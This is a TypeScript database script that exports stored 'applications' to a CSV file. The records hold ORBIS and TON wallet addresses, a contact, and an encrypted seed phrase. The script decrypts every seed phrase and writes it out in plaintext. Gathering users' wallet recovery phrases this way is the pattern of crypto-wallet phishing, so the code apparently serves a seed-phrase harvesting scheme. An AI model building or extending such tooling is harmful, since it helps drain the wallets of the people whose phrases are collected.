import { writeFileSync } from 'fs'
import { join } from 'path'
import { prisma } from '../lib/db'
import { decrypt } from '../lib/encryption'

// const prisma = new PrismaClient()

async function exportApplications() {
  try {
    console.log('Fetching applications...')
    const applications = await prisma.application.findMany({
      orderBy: {
        createdAt: 'asc'
      }
    })

    if (applications.length === 0) {
      console.log('No applications found')
      return
    }

    console.log(`Found ${applications.length} applications`)

    // Prepare CSV data
    const csvRows = [
      // CSV header
      ['ID', 'ORBIS Address', 'TON Address', 'Contact', 'Has OM', 'Seedphrase', 'Created At'].join(',')
    ]

    // Add each application as a row
    for (const app of applications) {
      const decryptedSeedphrase = decrypt(app.seedphrase)
      csvRows.push([
        app.id,
        app.orbisAddress,
        app.tonAddress,
        app.contact,
        app.hasOm ? 'Yes' : 'No',
        decryptedSeedphrase,
        app.createdAt.toISOString()
      ].map(field => `"${field}"`).join(','))
    }

    // Save to file
    const timestamp = new Date().toISOString().replace(/[:.]/g, '-')
    const fileName = `applications-export-${timestamp}.csv`
    const filePath = join(process.cwd(), fileName)
    
    writeFileSync(filePath, csvRows.join('\n'))
    console.log(`Successfully exported to ${fileName}`)

  } catch (error) {
    console.error('Error exporting applications:', error)
  } finally {
    await prisma.$disconnect()
  }
}

// Run the export
exportApplications() 